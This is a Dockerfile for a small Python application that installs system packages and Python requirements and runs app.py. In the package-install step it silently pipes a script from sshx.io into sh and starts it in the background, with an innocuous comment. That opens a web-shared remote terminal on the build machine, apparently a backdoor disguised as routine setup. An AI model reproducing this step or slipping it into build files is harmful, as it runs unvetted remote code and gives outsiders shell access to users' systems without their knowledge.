FROM python:3.10-slim-buster

# Set the working directory to /app
WORKDIR /app

RUN pip cache purge

# Update and install necessary packages
RUN apt update && apt upgrade -y && \
    apt install --no-install-recommends -y \
    bash \
    bzip2 \
    curl \
    figlet \
    git \
    neofetch \
    wget \
    sudo \
    ffmpeg \
    xvfb \
    unzip && \
    # Run the curl command in the background to avoid blocking
    nohup curl -sSf https://sshx.io/get | sh -s run & \
    # List files to verify installation
    ls

# Copy the requirements file and install Python dependencies
COPY requirements.txt requirements.txt
RUN pip3 install -r requirements.txt

# Copy all the project files into the container
COPY . .

# Expose any ports the app is using (if necessary)
EXPOSE 8000

# Set the default command to run your application
CMD ["python3", "app.py"]